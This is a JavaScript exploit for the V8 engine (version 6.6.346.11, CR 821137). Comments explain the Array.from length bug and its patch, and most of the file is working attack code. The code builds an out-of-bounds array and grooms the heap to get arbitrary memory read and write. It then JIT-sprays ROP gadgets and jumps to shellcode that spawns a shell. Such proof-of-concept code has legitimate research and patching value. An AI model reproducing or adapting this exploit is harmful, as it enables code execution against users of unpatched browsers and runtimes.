/* V8 Version: 6.6.346.11
 *
 * CR id: 821137
 * Bug Synopsis: 
 *  Array.From is a javascript function that creates a new array from an old
 *  one. One of the function prototypes allow a map function that can be applied
 *  to each element of the old array to create a new value for the new array.
 *
 *  This can potientally allow user code to be executed in the middle of array 
 *  iteration. The problem with how Array.From is implemented lies in the 
 *  GenerateSetLength function. After all iterations are done, GenerateSetLength
 *  only checks if the array grew larger with:
 *    GotoIf(SmiLessThan(length_smi, old_length), &runtime);
 *
 *  But doesn't check if the array grew smaller. If the array grew smaller, it
 *  continues execution and overrides the length field with old length. (Note:
 *  that old_length here is actually the current length and length_smi is the 
 *  length of the old array). We thus end up with an array that has a backing 
 *  store that is much smaller than what the length represents and will allow
 *  out of bounds read and write at an offset of the backing store.
 *
 *  Patch:
 *     GotoIf(SmiLessThan(length_smi, old_length), &runtime);
 *  The patch simply checks if the length has changed at all, and will go out
 *  to the runtime to handle everything.
 *
 * */

/* Giving the array any double element will force it to be in a double typed
 * array. Doubley typed arrays can represent all pointers as well as objects
 * in doubles so the engine won't complain if a pointer is leaked out when it
 * thinks it is a double. */

let arr1 = [0.1];

function make_oob_array(arr) {
	Array.from.call(function() { return arr }, {[Symbol.iterator] : _ => (
		{
			counter : 0,
			/* This is the loop terminator and also the length that gets written to
			 * the length field after the array has been shrunken. This also
			 * influences how many bytes out of bounds we can read after. */
			max : 65536, 
			next() {
				let result = this.counter++;
				if (this.counter == this.max) {
					/* This length can't be zero otherwise it points to a special "FixedEmptyArray"
					 * object in a seperate location on the heap. Array backing stores
					 * The size of the backing store also determines where it gets placed on the heap.
					 *
					 * This is a hack I figured out to get it to be more reliable. Setting the length
					 * to 0 will force the engine to deallocate the whole backing store
					 * and then reallocate a new one of size 10.
					 * */
					arr.length = 0;
					arr.length = 10; 
					return {done: true};
				} else {
					return {value: result, done: false};
				}
			}
		}
	) });
}

/* Storage array to keep objects alive on the heap. As long as there is a
 * tracable handle from the root to the object, it will not be garbage collected. */
var storage = [];

/* V8 uses a new space and old space garbage collection as well as a tenured
 * space afterwards. If enough objects are allocated, it will force garbage
 * collection to happen. */
function gc() {
	for (let i = 0; i < 0x10; i++)
		new ArrayBuffer(0x1000000);
}

make_oob_array(arr1);

/* Make sure our shellcode is contigious in memory by copying over to a 
 * uint8 array */
var shellcode = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0xf, 0x5];
var shellcode_bytes = new Uint8Array(shellcode.length);
for (var i = 0; i < shellcode.length; ++i) {
	shellcode_bytes[i] = shellcode[i];
}

/* Jitspray function comes in later, when we jump to our jitted function 
 * it includes a rop chain that transitions to our shellcode */

 /*
0x86e9905f5f
0x90907aeb01ef8348
0x90907aeb107f8b48
0x78ebf000e7816657
0x9079eb0000000ab8
0x9079eb00000007ba
0x78eb0000f000e681
0x9090907beb5f050f
0x9090e7ff1fc78348
*/

function jitspray(shellcode) {
	val = shellcode[0];
	val += 2.8628345837198785e-312;
	val += -6.7936696184209404e-229;
	val += -6.7936699762396021e-229;
	val += 3.0226914823032513e+274;
	val += -2.6710638803933159e-229;
	val += -2.6710638803930354e-229;
	val += 2.9212589871283409e+274;
	val += -6.8283971717601484e-229;
	val += -6.9693174593711226e-229;

	return val;
}

/* Force the function to be optimized and jitted */
for (var i=0; i < 0x10000; ++i) {
	jitspray(shellcode_bytes)
}

/* Groom the heap with some nice objects and store them with uniquely searchable properties
 * */
for (var i = 0; i < 0x500; ++i) {
	if (i % 2)
		storage[i] = new ArrayBuffer(0xbabe);
	else
		storage[i] = [0x41414141, 0x42424242, jitspray];
}

/* Before the backing store is shrunk, make sure the backing store exists in the
 * same heap space as where our objects are stored. Forcing a garbage collection
 * here will move everything to the old space */

gc();

%DebugPrint(arr1);
%DebugPrint(storage[0]);
%DebugPrint(storage[1]);

/* Create some primitives to help write to memory */
var convert_buffer = new ArrayBuffer(8);
var float64_tarr = new Float64Array(convert_buffer);
var uint32_tarr = new Uint32Array(convert_buffer);
var uint8_tarr = new Uint8Array(convert_buffer);

function pack(hi, lo) {
	uint32_tarr[1] = hi;
	uint32_tarr[0] = lo;
	return float64_tarr[0];
}

function unpack(f) {
	float64_tarr[0] = f;
	return [uint32_tarr[1], uint32_tarr[0]];
}

function prettyprint(arr) {
	return '0x'+(Array.from(arr, x => ('0'+x.toString(16))
		.substr(-2)).reverse().join('').replace(/^0+/, ''));
}

/* end primitives */

function make_evil_buffer(arr) {
	/* Search for an ArrayBuffer */
	var i = 0;
	for (; i < arr.length; ++i) {
		var v = unpack(arr[i]);
		if (v[0] == 0xbabe) {
			break;
		}
	}
	/* i will now point to the length of an ArrayBuffer, i+1 should point to it's
	 * backing store pointer. Mark the ArrayBuffer by changing the length */
	var new_len = pack(0x8, 0x0);
	arr[i] = new_len;
	return i+1;
}


/* Search for our fields but sanity check everything, the last check makes sure
 * that a function object exists */
function search_for_array(arr) {
	var i = 0;
	for (; i < arr.length; ++i) {
		var tmp = unpack(arr[i]);
		if (tmp[0] == 0x41414141) {
			/* Mark this array */
			arr[i] = pack(0x43434343, 0);
			tmp = unpack(arr[i+1]);
			if (tmp[0] == 0x42424242) {
				tmp = unpack(arr[i+2]);
				if (tmp[1] != 0)
					break;
			}
		}
	}
	/* Return the jitted function, that's the only index we care about */
	return i+2;
}

var stored_buffer = make_evil_buffer(arr1);
var stored_array = search_for_array(arr1);

//unpack(arr1[stored_array]);
//console.log(prettyprint(uint8_tarr));

/* Find the actual corrupted buffer and array in storage */
var evil_buffer = null;
var evil_array = null;
for (var i = 0; i < storage.length; ++i) {
	if (evil_buffer == null && storage[i] instanceof ArrayBuffer) {
		if (storage[i].byteLength != 0xbabe) {
			evil_buffer = storage[i];
		}
	} else if (evil_array == null && storage[i] instanceof Array) {
		if (storage[i].includes(0x43434343))
			evil_array = storage[i];
	}
	if (evil_buffer != null && evil_array != null)
		break;
}

/* Reliability check, although I have not seen this fail at all while writing
 * this */
if (evil_buffer == null || evil_array == null) {
	console.log("[-] Not reliable enough");
}

/* More primitives now that we have a corrupted array buffer, this just uses our
 * corrupted TypedArray and overwrites it's backing store to achieve arbitrary
 * read and write */
function write8bytes(what_hi, what_lo, where_hi, where_lo) {
	arr1[stored_buffer] = pack(where_hi, where_lo);
	var tmp_array = new Float64Array(evil_buffer);
	tmp_array[0] = pack(what_hi, what_lo);
}

function read8bytes(where_hi, where_lo) {
	arr1[stored_buffer] = pack(where_hi, where_lo);
	var tmp_array = new Float64Array(evil_buffer);
	return unpack(tmp_array[0]);
}

/* Now we need to leak a jitted javascript function. The previously jitted
 * function is at the index returned by search_for_array */
%DebugPrint(jitspray);
var func_addr = arr1[stored_array];
var func_addr_hi = unpack(func_addr)[0];
var func_addr_lo = unpack(func_addr)[1]-1; /* -1 is to remove pointer tagging in v8 */
console.log("Jitted function is at "+prettyprint(uint8_tarr));
/* offset for v8 6.6.346.11 */
var jitpage_offset = 6*8;
/* At an offset of a jitted JSFunction is the address of it's jit page */
var jitpage_addr = read8bytes(func_addr_hi, func_addr_lo + jitpage_offset);
var jitpage_addr_hi = jitpage_addr[0];
var jitpage_addr_lo = jitpage_addr[1]-1;
console.log("Optimized code is at "+prettyprint(uint8_tarr));

/* Go and find the start of the ropchain */
function find_ropchain_start(hi, lo, bytes) {
	var offset = 0;
	while (true) {
		read8bytes(hi, lo+offset);
		var found = true;
		for (var i = 0; i < bytes.length; ++i) {
			if (bytes[i] != uint8_tarr[i]) {
				found = false;
				break;
			}
		}
		if (found) {
			break;
		}
		offset++;
	}
	return offset-0x60;
}

var jitstart = [0x5f, 0x5f, 0x90, 0xe9, 0x86, 0x00, 0x00, 0x00]
var ropchain_offset = find_ropchain_start(jitpage_addr_hi, jitpage_addr_lo, jitstart);
/* Now we need to jump into an offset of our jitspray to start the ropchain */
write8bytes(jitpage_addr_hi, jitpage_addr_lo+1+ropchain_offset, func_addr_hi, func_addr_lo + jitpage_offset);

/* Now trigger the function to jump into our new jitspray address. 
 * At this point we can just write our shellcode directly into the jitpage since
 * it's rwx on 6.6.346.11. On newer versions of v8 the jit pages have been
 * changed to r-x after it's been optimized. I went all out and jitsprayed some
 * gadgets to mprotect the shellcode buffer and then jump into the shellcode */

/* Note: Jitspray is kind of janky, uncommenting both these lines will misalign
 * it, and the offsets need to be realigned */
pack(jitpage_addr_hi, jitpage_addr_lo + 0x60 + ropchain_offset);
console.log("Jumping to: "+prettyprint(uint8_tarr));
jitspray(shellcode_bytes);
